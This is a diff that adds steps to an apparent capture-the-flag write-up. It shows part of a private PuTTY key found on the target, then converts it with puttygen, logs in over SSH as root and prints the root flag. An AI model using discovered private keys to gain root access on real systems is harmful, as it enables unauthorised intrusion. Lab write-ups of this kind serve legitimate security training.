@@ -64,3 +64,15 @@ managed to find rsa file:
        AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
        NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
        Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
+
+turned a rsa key in to a file pasting it into a text file and turning it it to rsa key using putty-tools: puttygen keep.ppk -O private-openssh -o id_rsa
+
+modifying the owner permissions using chmod 400
+
+ssh -i id_rsa root@"machine IP"
+
+got a root privilages
+
+ls and i got a root flag:
+
+a76bafd481c4a32622cc94178118e055
